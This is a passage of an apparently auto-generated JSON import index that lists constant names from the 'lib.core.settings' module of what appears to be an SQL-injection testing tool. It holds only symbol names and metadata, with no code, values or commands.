        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "URI_INJECTABLE_REGEX",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "USER_AGENT_ALIASES",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "XML_RECOGNITION_REGEX",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "IS_WIN",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "MAX_NUMBER_OF_THREADS",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "PYVERSION",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "EXCLUDE_UNESCAPE",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "GIT_REPOSITORY",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "IS_WIN",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "VERSION",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "TYPE",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "ZIPBALL_PAGE",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "BASIC_HELP_ITEMS",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "DUMMY_URL",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "IGNORED_OPTIONS",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "INFERENCE_UNKNOWN_CHAR",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "IS_WIN",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "MAX_HELP_OPTION_LENGTH",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "VERSION_STRING",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "HEURISTIC_PAGE_SIZE_THRESHOLD",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "PAYLOAD_XML_FILES",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "BLOCKED_IP_REGEX",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "DEFAULT_COOKIE_DELIMITER",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "EVENTVALIDATION_REGEX",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "HEURISTIC_PAGE_SIZE_THRESHOLD",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "IDENTYWAF_PARSE_LIMIT",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "MAX_CONNECTION_TOTAL_SIZE",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "META_CHARSET_REGEX",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "PARSE_HEADERS_LIMIT",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "PRINTABLE_BYTES",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "SELECT_FROM_TABLE_REGEX",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "UNICODE_ENCODING",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "VIEWSTATE_REGEX",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "DEFAULT_PAGE_ENCODING",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "DIFF_TOLERANCE",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "HTML_TITLE_REGEX",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "LOWER_RATIO_BOUND",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "MAX_DIFFLIB_SEQUENCE_LENGTH",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "MAX_RATIO",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "MIN_RATIO",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "REFLECTED_VALUE_MARKER",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "UPPER_RATIO_BOUND",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "URI_HTTP_HEADER",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "ASTERISK_MARKER",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "BOUNDARY_BACKSLASH_MARKER",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "DEFAULT_CONTENT_TYPE",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "DEFAULT_COOKIE_DELIMITER",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "DEFAULT_GET_POST_DELIMITER",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "DEFAULT_USER_AGENT",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "EVALCODE_ENCODED_PREFIX",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "HTTP_ACCEPT_ENCODING_HEADER_VALUE",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "HTTP_ACCEPT_HEADER_VALUE",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "IPS_WAF_CHECK_PAYLOAD",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "IS_WIN",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "JAVASCRIPT_HREF_REGEX",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "LARGE_READ_TRIM_MARKER",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "LIVE_COOKIES_TIMEOUT",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "MAX_CONNECTION_READ_SIZE",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "MAX_CONNECTIONS_REGEX",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "MAX_CONNECTION_TOTAL_SIZE",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "MAX_CONSECUTIVE_CONNECTION_ERRORS",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "MAX_MURPHY_SLEEP_TIME",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "META_REFRESH_REGEX",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "MAX_TIME_RESPONSES",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "MIN_TIME_RESPONSES",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "PAYLOAD_DELIMITER",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "PERMISSION_DENIED_REGEX",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "PLAIN_TEXT_CONTENT_TYPE",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "RANDOM_INTEGER_MARKER",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "RANDOM_STRING_MARKER",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "REPLACEMENT_MARKER",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "TEXT_CONTENT_TYPE_REGEX",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "UNENCODED_ORIGINAL_VALUE",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "UNICODE_ENCODING",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "URI_HTTP_HEADER",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "WARN_TIME_STDEV",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "WEBSOCKET_INITIAL_TIMEOUT",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "YUGE_FACTOR",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "UNICODE_ENCODING",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "PYVERSION",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "GET_VALUE_UPPERCASE_KEYWORDS",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "INFERENCE_MARKER",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "MAX_TECHNIQUES_PER_VALUE",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "SQL_SCALAR_REGEX",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "UNICODE_ENCODING",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "DEFAULT_COOKIE_DELIMITER",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "MAX_CONNECTION_READ_SIZE",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "MAX_CONNECTION_TOTAL_SIZE",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "MAX_SINGLE_URL_REDIRECTIONS",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "MAX_TOTAL_REDIRECTIONS",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "IS_WIN",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "METASPLOIT_SESSION_TIMEOUT",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "SHELLCODEEXEC_RANDOM_STRING_MARKER",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "BACKDOOR_RUN_CMD_TIMEOUT",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "EVENTVALIDATION_REGEX",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "SHELL_RUNCMD_EXE_TAG",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "SHELL_WRITABLE_DIR_TAG",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "VIEWSTATE_REGEX",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "CHAR_INFERENCE_MARK",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "INFERENCE_BLANK_BREAK",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "INFERENCE_EQUALS_CHAR",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "INFERENCE_GREATER_CHAR",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "INFERENCE_MARKER",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "INFERENCE_NOT_EQUALS_CHAR",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "INFERENCE_UNKNOWN_CHAR",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "MAX_BISECTION_LENGTH",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "MAX_REVALIDATION_STEPS",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "NULL",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "PARTIAL_HEX_VALUE_MARKER",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "PARTIAL_VALUE_MARKER",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "PAYLOAD_DELIMITER",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "RANDOM_INTEGER_MARKER",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "VALID_TIME_CHARS_RUN_THRESHOLD",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "DNS_BOUNDARIES_ALPHABET",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "MAX_DNS_LABEL",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "PARTIAL_VALUE_MARKER",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "CHECK_ZERO_COLUMNS_THRESHOLD",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "MAX_ERROR_CHUNK_LENGTH",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "MIN_ERROR_CHUNK_LENGTH",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "NULL",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "PARTIAL_VALUE_MARKER",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "ROTATING_CHARS",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "SLOW_ORDER_COUNT_THRESHOLD",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "SQL_SCALAR_REGEX",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "TURN_OFF_RESUME_INFO_LIMIT",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "FUZZ_UNION_ERROR_REGEX",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "FUZZ_UNION_MAX_COLUMNS",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "LIMITED_ROWS_TEST_NUMBER",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "MAX_RATIO",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "MIN_RATIO",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "MIN_STATISTICAL_RANGE",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "MIN_UNION_RESPONSES",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "NULL",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "ORDER_BY_MAX",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "ORDER_BY_STEP",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "UNION_MIN_RESPONSE_CHARS",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "UNION_STDEV_COEFF",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "MAX_BUFFERED_PARTIAL_UNION_LENGTH",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "NULL",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "SQL_SCALAR_REGEX",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "TURN_OFF_RESUME_INFO_LIMIT",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "IS_WIN",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "RESTAPI_DEFAULT_ADAPTER",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "RESTAPI_DEFAULT_ADDRESS",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "RESTAPI_DEFAULT_PORT",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "RESTAPI_UNSUPPORTED_OPTIONS",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "VERSION_STRING",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "BRUTE_COLUMN_EXISTS_TEMPLATE",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "BRUTE_TABLE_EXISTS_TEMPLATE",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "METADB_SUFFIX",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "UPPER_CASE_DBMSES",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "CRAWL_EXCLUDE_EXTENSIONS",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "IS_WIN",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "VERSION",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "COMMON_PASSWORD_SUFFIXES",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "COMMON_USER_COLUMNS",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "DEV_EMAIL_ADDRESS",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "DUMMY_USER_PREFIX",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
